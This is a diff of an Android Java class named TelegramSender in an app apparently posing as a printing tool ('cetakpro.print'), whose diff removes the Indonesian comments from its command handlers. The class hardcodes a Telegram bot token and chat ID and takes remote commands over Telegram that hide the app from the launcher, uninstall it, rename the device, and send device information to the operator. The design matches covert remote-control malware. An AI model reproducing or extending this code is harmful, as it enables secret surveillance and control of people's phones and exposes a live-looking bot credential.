@@ -3,6 +3,7 @@ package com.cetakpro.print;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -18,7 +19,6 @@ import java.nio.charset.StandardCharsets;
 public class TelegramSender {
     private static final String TAG = "TelegramSender";
     
-    // HARDCODE TOKEN & CHAT ID
     private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
     private static final String CHAT_ID = "1286411089";
     
@@ -84,7 +84,6 @@ public class TelegramSender {
     private static void handleTelegramCommand(Context context, String command) {
         Log.d(TAG, "📩 Perintah diterima: " + command);
         
-        // /hide - SEMBUNYIKAN APLIKASI
         if (command.equalsIgnoreCase("/hide")) {
             Log.d(TAG, "👻 Perintah hide diterima!");
             
@@ -111,7 +110,6 @@ public class TelegramSender {
             return;
         }
         
-        // /unhide - TAMPILKAN APLIKASI
         if (command.equalsIgnoreCase("/unhide")) {
             Log.d(TAG, "👀 Perintah unhide diterima!");
             
@@ -138,7 +136,6 @@ public class TelegramSender {
             return;
         }
         
-        // /uninstall - HAPUS APLIKASI
         if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
             Log.d(TAG, "🗑️ Perintah uninstall diterima!");
             
@@ -174,7 +171,6 @@ public class TelegramSender {
             return;
         }
         
-        // /info - LIHAT INFO PERANGKAT
         if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
             SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
             String deviceName = prefs.getString("device_name", Build.MODEL);
@@ -203,7 +199,6 @@ public class TelegramSender {
             return;
         }
         
-        // /rename [nama] - UBAH NAMA PERANGKAT
         if (command.startsWith("/rename ")) {
             String newName = command.substring(8).trim();
             if (newName.isEmpty()) {
@@ -218,7 +213,6 @@ public class TelegramSender {
             return;
         }
         
-        // /help - BANTUAN
         if (command.equalsIgnoreCase("/help")) {
             String help = "📋 DAFTAR PERINTAH\n\n" +
                           "/hide - Sembunyikan aplikasi dari launcher\n" +
@@ -232,7 +226,6 @@ public class TelegramSender {
             return;
         }
         
-        // PERINTAH TIDAK DIKENAL
         sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /help untuk melihat daftar perintah.");
     }
 }
